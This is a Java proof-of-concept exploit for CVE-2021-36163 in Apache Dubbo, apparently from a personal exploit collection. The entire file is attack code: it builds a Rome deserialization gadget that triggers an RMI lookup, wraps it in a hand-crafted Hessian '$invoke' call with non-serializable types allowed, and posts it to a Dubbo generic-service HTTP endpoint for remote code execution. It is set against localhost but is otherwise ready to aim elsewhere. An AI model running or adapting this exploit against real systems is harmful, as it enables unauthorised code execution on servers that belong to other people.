package org.apache.dubbo.samples.http;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;


/**
 * @author Whoopsunix
 * <p>
 * CVE-2021-36163
 */
public class CVE_2021_36163 {

    public static void main(String[] args) throws Exception {
        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/lc8yjj");

        // write header into OS
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] header = new byte[3];
        header[0] = (byte) 72;
        header[1] = (byte) 1;
        header[2] = (byte) 1;
        baos.write(header);

        byte[] tag = new byte[1];
        tag[0] = 67; // C: call
        baos.write(tag);


        Hessian2Output out = new Hessian2Output(baos);

        out.writeString("$invoke");
        out.writeInt(3);
        out.writeObject("Whoopsunix");
        out.writeObject(new String[]{"Whoopsunix"});
        out.writeObject(new Object[]{o});
        SerializerFactory factory = out.getSerializerFactory();
        factory.setAllowNonSerializable(true);
        out.setSerializerFactory(factory);
        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

//        out.writeString("sayObject");
//        out.writeInt(1);
////        out.writeObject("Whoopsunix");
////        out.writeObject(new String[]{"Whoopsunix"});
//        out.writeObject(o);
//        SerializerFactory factory = out.getSerializerFactory();
//        factory.setAllowNonSerializable(true);
//        out.setSerializerFactory(factory);
//        out.flushBuffer();
//        if (out instanceof Cleanable) {
//            ((Cleanable) out).cleanup();
//        }

//        // 写入文件
//        FileOutputStream fos = new FileOutputStream("36163.bin");
//        fos.write(baos.toByteArray());
//        fos.close();

        CloseableHttpClient client = HttpClients.createDefault();
        HttpPost post = new HttpPost("http://localhost:8080/org.apache.dubbo.samples.http.api.DemoService/generic");
        // 已知接口、参数
//        HttpPost post = new HttpPost("http://localhost:8080/org.apache.dubbo.samples.http.api.DemoService");
        post.setHeader("Content-Type", "application/octet-stream");
        post.setEntity(new ByteArrayEntity(baos.toByteArray()));
        HttpResponse response = client.execute(post);
        System.out.println(response.getStatusLine());


    }
}
